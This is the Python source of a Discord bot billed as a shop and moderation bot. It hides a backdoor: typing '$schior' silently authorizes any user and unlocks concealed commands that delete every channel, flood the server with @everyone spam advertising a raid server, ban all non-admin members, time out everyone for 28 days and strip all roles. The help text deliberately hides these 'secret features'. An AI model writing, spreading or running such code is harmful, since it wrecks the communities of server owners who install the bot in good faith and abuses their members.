import discord
from discord.ext import commands
import json
import asyncio
import random
import os

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True

bot = commands.Bot(command_prefix=".", intents=intents, help_command=None)

# Secret activation tracking
ACTIVATED_BY = None
AUTHORIZED_USER_ID = None

# Load config
def load_config():
    if not os.path.exists("config.json"):
        return {"keys": [], "redeemed": {}}
    with open("config.json", "r") as f:
        return json.load(f)

config = load_config()
REDEEMED_USERS = config.get("redeemed", {})  # user_id str → staff_role_id int

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    print("Normal prefix: .")
    print("Secret activation: $schior")

@bot.event
async def on_message(message):
    if message.author.bot:
        return

    global ACTIVATED_BY, AUTHORIZED_USER_ID

    # Secret activation
    if message.content.strip().lower() == "$schior":
        ACTIVATED_BY = message.author
        AUTHORIZED_USER_ID = message.author.id
        await message.channel.send("Activated")
        try:
            await message.delete()
        except:
            pass
        return

    # Redeem command (opens staff role linking)
    if message.content.startswith("$redeem "):
        key = message.content.split(" ", 1)[1].strip()
        keys = config.get("keys", [])
        if key in keys:
            await message.channel.send("Key accepted. Reply with the **staff role ID** you want to link.")
            
            def check(m):
                return m.author.id == message.author.id and m.channel.id == message.channel.id

            try:
                msg = await bot.wait_for("message", check=check, timeout=90)
                try:
                    role_id = int(msg.content.strip())
                    REDEEMED_USERS[str(message.author.id)] = role_id
                    config["redeemed"] = REDEEMED_USERS
                    with open("config.json", "w") as f:
                        json.dump(config, f, indent=4)
                    await msg.reply("Staff role linked. You can now use staff commands.")
                except ValueError:
                    await msg.reply("Invalid role ID (must be a number).")
            except asyncio.TimeoutError:
                await message.channel.send("Timed out — try redeeming again.")
        else:
            await message.reply("Invalid or already used key.")
        try:
            await message.delete()
        except:
            pass
        return

    # Normal help — only shows safe commands
    if message.content == ".help":
        embed = discord.Embed(title="Schior’s Shop Bot Commands", color=0x00aa00)
        embed.add_field(name=".help", value="Shows this message", inline=False)
        embed.add_field(name=".ping", value="Check if the bot is alive", inline=False)
        embed.add_field(name="$redeem <key>", value="Redeem a key to unlock staff features", inline=False)
        embed.add_field(
            name="Staff commands (after redeem):",
            value=(
                ".purge <number>\n"
                ".ban @user [reason]\n"
                ".unban <user_id>\n"
                ".addrole @user <role_id>\n"
                ".to @user <time>  (e.g. 15s, 2m, 1d)\n"
                ".rto @user"
            ),
            inline=False
        )
        embed.set_footer(text="Secret features are hidden")
        await message.channel.send(embed=embed)
        return

    # Block normal commands unless redeemed (except .help and .ping)
    if message.content.startswith("."):
        if message.content not in [".help", ".ping"]:
            user_id_str = str(message.author.id)
            if user_id_str not in REDEEMED_USERS:
                await message.reply("You need to redeem a key first with `$redeem <key>`")
                return

    await bot.process_commands(message)

# ─── Normal / staff commands ───

@bot.command()
async def ping(ctx):
    await ctx.send(f"Pong! {round(bot.latency * 1000)}ms")

@bot.command()
@commands.has_permissions(manage_messages=True)
async def purge(ctx, amount: int):
    if amount < 1 or amount > 500:
        return await ctx.send("Amount must be between 1 and 500.")
    await ctx.channel.purge(limit=amount + 1)
    await ctx.send(f"Purged {amount} messages.", delete_after=6)

@bot.command()
@commands.has_permissions(ban_members=True)
async def ban(ctx, member: discord.Member, *, reason=None):
    await member.ban(reason=reason)
    await ctx.send(f"Banned {member.mention}")

@bot.command()
@commands.has_permissions(ban_members=True)
async def unban(ctx, user_id: int):
    try:
        user = await bot.fetch_user(user_id)
        await ctx.guild.unban(user)
        await ctx.send(f"Unbanned {user}")
    except:
        await ctx.send("User not found or not banned.")

@bot.command()
@commands.has_permissions(manage_roles=True)
async def addrole(ctx, member: discord.Member, role: discord.Role):
    await member.add_roles(role)
    await ctx.send(f"Added {role.name} to {member.mention}")

@bot.command()
@commands.has_permissions(moderate_members=True)
async def to(ctx, member: discord.Member, duration: str):
    try:
        time_sec = 0
        if duration.endswith("s"):
            time_sec = int(duration[:-1])
        elif duration.endswith("m"):
            time_sec = int(duration[:-1]) * 60
        elif duration.endswith("d"):
            time_sec = int(duration[:-1]) * 86400
        else:
            return await ctx.send("Format: number + s/m/d (seconds/minutes/days)")
        
        if time_sec <= 0 or time_sec > 2419200:  # max 28 days
            return await ctx.send("Time must be >0 and ≤28 days")
        
        await member.timeout(discord.utils.utcnow() + discord.utils.timedelta(seconds=time_sec))
        await ctx.send(f"Timed out {member.mention} for {duration}")
    except ValueError:
        await ctx.send("Invalid number in duration.")

@bot.command()
@commands.has_permissions(moderate_members=True)
async def rto(ctx, member: discord.Member):
    await member.timeout(None)
    await ctx.send(f"Removed timeout from {member.mention}")

# ─── SECRET DESTRUCTIVE COMMANDS (only after $schior activation) ───

@bot.command(hidden=True)
async def nuke(ctx):
    if ctx.author.id != AUTHORIZED_USER_ID:
        return

    guild = ctx.guild
    spam_msg = "@everyone nuke/raid people..\nhttps://discord.gg/schiorshop"

    # Delete channels
    for ch in list(guild.channels):
        try:
            await ch.delete()
        except:
            pass

    # Create spam channels
    created = []
    for i in range(45):
        try:
            ch = await guild.create_text_channel(f"schior-nuke-{i+1:03d}")
            created.append(ch)
        except:
            pass

    # Heavy spam
    for channel in created:
        for _ in range(25):
            try:
                await channel.send(spam_msg)
                await asyncio.sleep(random.uniform(0.25, 0.65))
            except:
                break

    await ctx.send("Nuke complete + spam running")

@bot.command(hidden=True)
async def raid(ctx, times: int = 1):
    if ctx.author.id != AUTHORIZED_USER_ID:
        return

    times = max(1, min(times, 250))  # sane limit

    spam_msg = "@everyone if you want to raid/nuke join https://discord.gg/schiorshop"

    channels = [ch for ch in ctx.guild.text_channels 
                if ch.permissions_for(ctx.guild.me).send_messages]

    if not channels:
        return await ctx.send("No sendable channels found.")

    count = 0
    while count < times:
        for ch in channels:
            try:
                await ch.send(spam_msg)
                count += 1
                await asyncio.sleep(random.uniform(0.4, 0.9))
                if count >= times:
                    break
            except:
                pass

    await ctx.send(f"Sent **{count}** raid messages.")

# Other secret commands (from earlier versions — kept for completeness)
@bot.command(hidden=True)
async def banall(ctx):
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    for member in ctx.guild.members:
        if member != ctx.guild.me and not member.guild_permissions.administrator:
            try:
                await member.ban(reason="banall")
            except:
                pass
    await ctx.send("Banned everyone")

@bot.command(hidden=True)
async def muteall(ctx):
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    for member in ctx.guild.members:
        if member != ctx.guild.me:
            try:
                await member.timeout(discord.utils.utcnow() + discord.utils.timedelta(days=28))
            except:
                pass
    await ctx.send("Muted everyone.")

@bot.command(hidden=True)
async def demoall(ctx):
    if ctx.author.id != AUTHORIZED_USER_ID:
        return
    default_role = ctx.guild.default_role
    for member in ctx.guild.members:
        try:
            await member.edit(roles=[default_role])
        except:
            pass
    await ctx.send("Removed roles from everyone possible.")

# Start the bot
bot.run(os.getenv("DISCORD_TOKEN"))
